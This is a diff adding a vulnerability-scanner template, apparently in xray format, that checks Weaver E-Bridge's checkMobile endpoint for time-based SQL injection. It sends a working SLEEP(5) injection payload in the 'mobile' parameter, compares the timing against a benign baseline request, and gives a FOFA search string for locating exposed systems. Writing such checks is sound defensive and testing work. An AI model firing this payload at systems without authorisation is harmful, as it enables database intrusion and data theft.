@@ -1,0 +1,42 @@
+id: weaver-ebridge-checkmobile-sqli
+info:
+  name: Weaver E-Bridge CheckMobile SQL Injection
+  author: ZacharyZcR
+  severity: critical
+  description: |
+    Weaver E-Bridge system has a SQL injection vulnerability in the checkMobile interface.
+    The vulnerability allows attackers to execute arbitrary SQL commands and obtain sensitive database information.
+    FOFA: app="泛微-云桥e-Bridge"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-Bridge%E7%B3%BB%E7%BB%9FcheckMobile%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /taste/checkMobile
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      params:
+        company: "1"
+        mobile: "1' AND (SELECT 8094 FROM (SELECT(SLEEP(5)))mKjk) OR 'KQZm'='REcX"
+        openid: "1"
+        source: "1"
+        userName: "1"
+    expression: "response.elapsed.seconds() >= 5"
+
+  r1:
+    request:
+      method: POST
+      path: /taste/checkMobile
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      params:
+        company: "1"
+        mobile: "1"
+        openid: "1"
+        source: "1"
+        userName: "1"
+    expression: "response.elapsed.seconds() < 2"
+
+expression: r0() && r1()
